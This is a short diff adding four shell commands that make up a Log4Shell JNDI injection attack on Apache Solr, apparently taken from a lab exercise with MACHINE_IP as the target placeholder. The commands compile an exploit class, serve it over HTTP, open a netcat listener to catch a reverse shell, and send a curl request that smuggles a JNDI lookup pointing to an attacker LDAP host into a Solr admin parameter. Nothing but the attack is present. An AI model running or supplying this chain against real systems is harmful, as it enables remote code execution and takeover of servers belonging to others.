@@ -1,0 +1,4 @@
+javac Exploit.java -source 8 -target 8
+python3 -m http.server
+nc -nlvp 9999
+curl 'http://MACHINE_IP:8983/solr/admin/cores?foo=$\{jndi:ldap://YOUR.ATTACKER.IP.ADDRESS:1389/Exploit\}'
